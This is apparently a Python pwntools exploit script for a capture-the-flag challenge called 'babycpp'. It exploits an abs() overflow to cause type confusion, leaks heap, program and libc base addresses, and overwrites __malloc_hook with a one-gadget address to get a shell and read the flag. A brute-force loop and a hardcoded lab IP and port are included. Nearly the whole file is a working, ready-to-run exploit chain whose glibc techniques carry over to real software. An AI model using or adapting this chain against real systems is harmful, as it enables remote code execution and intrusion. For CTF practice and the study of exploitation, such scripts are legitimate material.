# File: exp.py
# Author: raycp
# Date: 2019-06-10
# Description: exp for babycpp, abs vuln to form a type confused vuln.

from pwn_debug import *


pdbg=""
p=''
membp=""
elf=""
libc=""

#io_file=IO_FILE_plus()
#io_file.show()

def new_int():
    p.recvuntil("choice:")
    p.sendline("0")
    p.recvuntil("Your choice:")
    p.sendline("1")

def new_string():
    p.recvuntil("choice:")
    p.sendline("0")
    p.recvuntil("Your choice:")
    p.sendline("2")

def show_element(hash_string,idx):
    p.recvuntil("choice:")
    p.sendline("1")
    p.recvuntil("array hash:")
    p.send(hash_string)
    p.recvuntil("idx:")
    p.sendline(str(idx))

def set_int_element(hash_string,idx,value):
    p.recvuntil("choice:")
    p.sendline("2")
    p.recvuntil("array hash:")
    p.send(hash_string)
    p.recvuntil("idx:")
    p.sendline(str(idx))
    p.recvuntil(" val:")
    p.sendline(hex(value))


def create_string_element(hash_string,idx,size,content):
    p.recvuntil("choice:")
    p.sendline("2")
    p.recvuntil("array hash:")
    p.send(hash_string)
    p.recvuntil("idx:")
    p.sendline(str(idx))
    p.recvuntil("obj:")
    p.sendline(str(size))
    p.recvuntil("content:")
    p.send(content)

def set_string_element(hash_string,idx,content):
    p.recvuntil("choice:")
    p.sendline("2")
    p.recvuntil("array hash:")
    p.send(hash_string)
    p.recvuntil("idx:")
    print idx
    p.sendline(str(idx))
    p.recvuntil("content:")
    p.send(content)

def update_hash(hash_string,idx,content):
    p.recvuntil("choice:")
    p.sendline("3")
    p.recvuntil("array hash:")
    p.send(hash_string)
    p.recvuntil("idx:")
    p.sendline(str(idx))
    p.recvuntil("hash:")
    p.send(content)

def select(hash_string):
    p.recvuntil("array hash:")
    p.send(hash_string)

def pwn(remote):
    
    #pdbg.bp([0x1056,0xfee,0xc41,0xe31])
    new_string()
    new_string()
    #select('\x00')
    
    # step1 guess the address of vtable of array. brute last 4 bytes to type confused
    guess_addr=membp.elf_base+0x201CE0
    guess_addr=0x5637c06b5000+0x201ce0

    int_value=guess_addr&0xffff
    string_value=int_value+0x20
    # playgroud is on the 0 array
    create_string_element('\x00',0,0x80,'a')
    create_string_element("\x01\x00",0,0x80,'b')

    # step2 with abs for 0x80000000, we can change the function ptr of array, wich will make type confused address.
    update_hash('\x00',0x80000000,p16(int_value))
    # step3 leak heap address
    show_element('\x00',0)
    p.recvuntil("array is ")
    leak_heap=int(p.recvuntil("\n")[:-1],16)
    heap_base= leak_heap-0x11ff0
    log.info("leak heap base: 0x%x"%(heap_base))
    
    # step 4 leak programe base by programe address.
    fake_obj=heap_base+0x11e70
    set_int_element("\x00",3,fake_obj)
    update_hash('\x00',0x80000000,p16(string_value))
    show_element('\x00',3)
    p.recvuntil("Content:")
    pro_base=u64(p.recvuntil("\n")[:-1].ljust(8,'\x00'))-0xda8
    log.info("leak pro base: 0x%x"%(pro_base))
    read_got=elf.got['read']+pro_base
    
    # step 5 build a fake string obj in heap and leak libc address
    update_hash('\x00',0x80000000,p16(int_value))
    fake_obj=heap_base+0x11ed0
    set_int_element('\x00',6,read_got)
    set_int_element('\x00',7,0x80)
    set_int_element('\x00',3,fake_obj)
    update_hash('\x00',0x80000000,p16(string_value))
    
    show_element('\x00',3)
    p.recvuntil("Content:")
    leak_libc=u64(p.recvuntil("\n")[:-1].ljust(8,'\x00'))
    libc_base= leak_libc-libc.symbols['read']
    malloc_hook=libc_base+libc.symbols['__malloc_hook']
    rce=libc_base+0x4f322  
    log.info("leak libc base: 0x%x"%(libc_base))
    
    # step 6 chang the string obj to malloc_hook
    update_hash('\x00',0x80000000,p16(int_value))
    fake_obj=heap_base+0x11ed0
    set_int_element('\x00',6,malloc_hook)
    update_hash('\x00',0x80000000,p16(string_value))
    
    #pdbg.bp([0x145a,0xc7f,0xec8])
    #pdbg.bp(command=['b*%s'%(hex(rce))])
    # step 7 overwrite malloc_hook to rce
    set_string_element('\x00',3,p64(rce))
    
    #pdbg.bp([0x13af],command=['b*%s'%(hex(rce))])
    # step 8 big scanf to trigger malloc
    p.recvuntil("choice:")
    p.sendline("2"*0x2000)
    if remote:
        p.sendline("echo '12345'")
        p.recvuntil("12345\n")
        p.sendline('cat flag')
        flag=p.recvuntil("\n")
        return flag
    else:
        p.sendline("echo '12345'")
        p.recvuntil("12345\n")
        p.sendline('cat flag')
        flag=p.recvuntil("\n")
        #return flag
        p.interactive()
        exit(0)
        flag=None

    return flag

def run_exp(ip,port,remote):
    global pdbg
    global p
    global membp
    global elf
    global libc
    pdbg=pwn_debug("./babycpp")

    pdbg.context.terminal=['tmux', 'splitw', '-h']

    #elf=pdbg.elf
    #libc=pdbg.libc
    pdbg.local()
    pdbg.debug("2.27")
    pdbg.remote(ip, port)
    while 1:
        try:
            p=pdbg.run("local")
            #p=pdbg.run("remote")
            #p=pdbg.run("debug")

            elf=pdbg.elf
            libc=pdbg.libc
            if not remote:
                membp=pdbg.membp
            flag=pwn(remote)
            if flag:
                print flag
                return flag
        except Exception, e:
            print str(e)
            p.close()


    return flag

if __name__ == '__main__':
    #pwn()
    run_exp("192.168.213.110",9998,0)


